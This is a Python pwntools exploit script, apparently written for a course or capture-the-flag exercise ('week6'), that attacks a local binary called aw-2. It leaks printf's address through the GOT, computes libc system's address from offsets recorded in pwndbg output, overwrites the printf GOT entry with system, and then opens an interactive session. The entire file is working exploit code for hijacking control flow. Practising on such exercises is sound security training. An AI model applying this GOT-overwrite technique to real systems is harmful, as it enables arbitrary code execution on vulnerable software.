#!/usr/bin/env python

from pwn import *

env = {
    'PATH': '/home/users/hobbes/week6/3-aw-2'
}

p = process('./aw-2', env=env)

printf = p.elf.got['printf']

print(p.recv())
p.sendline("8")
print(p.recv())
p.sendline(hex(printf))
data = p.recv()
print(repr(data))
libcPrintf = u64(data[30:38])

"""
$1 = {<text variable, no debug info>} 0x7f862d5f5390 <__libc_system>
pwndbg> print printf
$2 = {<text variable, no debug info>} 0x7f862d605800 <__printf>
"""

offset = 0x7f862d5f5390 - 0x7f862d605800
sys = libcPrintf + offset #+ 0x4526a #printf + offset + one_gadget offset

print("printf: " + hex(libcPrintf))
print("sys: " + hex(sys))

p.sendline("8")
print(p.recv(timeout=0.1))
p.sendline(hex(printf))
print(p.recv(timeout=0.1))
p.sendline(p64(sys))
print(p.recv(timeout=0.1))

p.interactive()
